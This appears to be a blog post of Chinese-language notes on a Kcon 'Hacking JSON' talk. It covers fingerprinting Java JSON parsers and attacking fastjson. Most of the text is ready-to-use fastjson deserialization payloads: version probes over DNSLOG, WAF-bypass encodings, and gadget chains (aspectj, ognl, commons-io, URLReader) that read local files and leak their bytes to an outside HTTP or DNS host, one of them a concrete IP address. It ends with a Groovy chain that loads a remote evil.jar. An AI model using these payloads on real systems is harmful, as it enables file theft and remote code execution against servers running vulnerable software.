Kcon Hacking JSON 议题乱记

鉴别 fastjson

1. DNSLOG
   `{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}`
   `{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`

2. 根据解析变化
   `{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}`
   `{"ext":"blue","name":{"$ref":"$.ext"}}`

3. 根据响应状态
   `{"@type":"whatever"}`

鉴别 org.json

1. 特殊字符
   `{a:'\r'}`

鉴别 gson

1. 浮点类型精度丢失
   `{a:1.111111111111111111111111111}`
2. 注释符
   `#\r\n{a:1}`

鉴别 jackson

1. 浮点类型精度丢失
   `{a:1.111111111111111111111111111}`
2. 注释符
   `{a:1}/*#aaaa`
3. 不支持单引号作为界定符
   `{'a':'b'}`
4. 多余的类成员
   `{"name":"a","age":18}`

fastjson 版本探测：

1.2.47 版本

```json
[
  {
    "@type": "java.lang.Class",
    "val": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "dnslog"
  }
}
]
```

1.2.68 版本

```json
[
  {
    "@type": "java.lang.AutoCloseable",
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "dnslog"
  }
}
]
```

1.2.80 版本探测
如果收到了两个 dns 请求，则证明使用了 1.2.83 版本
如果收到了一个 dns 请求，则证明使用了 1.2.80 版本

```json
[
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "x": {
      "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "first.dnslog.cn"
  }
}
},
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "message": {
      "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "second.dnslog.cn"
  }
}
}
]
```

异常回显 fastjson 精确版本号

```json
{
  "@type": "java.lang.AutoCloseable"
```

探测环境

- org.springframework.web.bind.annotation.RequestMapping
- org.apache.catalina.startup.Tomcat
- groovy.lang.GroovyShell
- com.mysql.jdbc.Driver
- java.net.http.HttpClient

如果系统存在这个类，会返回一个类实例，如果不存在会返回 null

```json
{
  "z": {
    "@type": "java.lang.Class",
    "val": "org.springframework.web.bind.annotation.RequestMapping"
  }
}
{
  "z": {
    "@type": "java.lang.Class",
    "val": "java.net.http.HttpClient"
  }
}
```

通过使用 Character 将报错回显在 message 中

```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "com.mysql.jdbc.Driver"
}}
```

通过使用 DNSLOG 来探测依赖库

```json
{"@type":"java.net.Inet4Address",
   "val":{"@type":"java.lang.String"
{"@type":"java.util.Locale",
   "val":{"@type":"com.alibaba.fastjson.JSONObject",{
   "@type": "java.lang.String""@type":"java.util.Locale",
   "language":{"@type":"java.lang.String"
{1:{"@type":"java.lang.Class","val":"groovy.lang.GroovyShell"}},
"country":"gv.su18.dnslog.pw"
}}
}
```

绕过 WAF ，在部分中间件中，multipart 支持指定 Content-Transformer-Encoding
可以使用 Base64 或 quoted-printable （QP 编码） 来绕过 WAF



大量字符绕过 WAF
```json
[11111111111111111111111111111111111,[11111111111111111111111111111111111... ,[11111111111111111111111111111111111... ,[11111111111111111111111111111111111... ,[11111111111111111111111111111111111... ,...,{'\x40\u0074\x79\u0070\x65':xjava.lang.AutoCloseable"... ]]]]]
```

各种特性
```json
,new:[NaN,x'00',{,/*}*/'\x40\u0074\x79\u0070\x65':xjava.lang.AutoClosea ble"
```

文件写，结合 commons-io 代码（stream 里面写 68 的 payload）

```json
{"x":[{"@type":"java.lang.Exception","@type":"ognl.OgnlException",},{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}},{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
    }
}}]}
```



aspectj + ognl 任意文件读取 + DNSLOG 回显
打入白名单

```json
[{
   "@type":"java.lang.Exception",
   "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
},
   {
      "@type":"java.lang.Class",
      "val":{
         "@type":"java.lang.String"{
      "@type":"java.util.Locale",
      "val":{
         "@type":"com.alibaba.fastjson.JSONObject",{
      "@type":"java.lang.String"
      "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
      "newAnnotationProcessorUnits":[{}]
   }
}
},
   {
      "x":{
         "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
         "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
         "fileName":"aaa"
      }
   }]
```
aspectj + ognl 文件读取加 DNSLOG 回显
```json
{"a":{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
"fileName":"/Users/su18/Downloads/1.txt"},"b":
{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale", "val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale", "language":{"@type":"java.lang.String"{"$ref":"$"},"country":"aw.su18.dnslog.pw"}}}}}
```

commons-io + ognl + URLReader 单字节文件读取（回显情况观察数值）
```json
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file:///Users/su18/Downloads/1.txt"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}},"su17" : {"$ref":"$.su16.node.p.stream"},"su18":{
"$ref":"$.su17.bOM.bytes"}}
```

commons-io + ognl + URLReader 单字节文件读取（报错布尔）
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file:///Users/su18/Downloads/1.txt"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}]
```

commons-io + ognl + URLReader 单字节文件读取 HTTPLog 布尔回显（错误的时候有 log，正确时 无 log)
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file:///Users/su18/Downloads/1.txt"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su22":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://120.48.129.28:8080/test?","country":{"@type":"java.lang.String"{"$ref":"98"}}}}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su23" : {"$ref":"$[5].su22.node.p.stream"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[7].su20.node.p.stream"}}]
```


aspectj 读文件 + Character 报错回显
```json
{
"@type":"java.lang.Character"{"c":{
"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
"fileName":"/Users/su18/Downloads/1.txt"}}
```

commons-io + ognl + URLReader + aspectj HTTP Log 回显
```json
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://x.x.x.x:8080/test?","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"/Users/su18/Downloads/1.txt"}]}}}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}},"su17" : {"$ref":"$.su16.node.p.stream"}}
```


groovy 远程类加载 

加白名单
```json
{
  "@type":"java.lang.Exception",
  "@type":"org.codehaus.groovy.control.CompilationFailedException",
  "unit":{
  }
```

远程类加载
```json
{
  "@type":"org.codehaus.groovy.control.ProcessingUnit",
  "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
  "config":{
    "@type": "org.codehaus.groovy.control.CompilerConfiguration",
    "classpathList":["http://.x.x.x:8080/evil.jar"]
  },
  "gcl":null,
  "destDir": "/tmp"
}
```

其他PPT中的组合链感觉要求过高暂未尝试，按需不定期更新
感谢作者的精彩分享
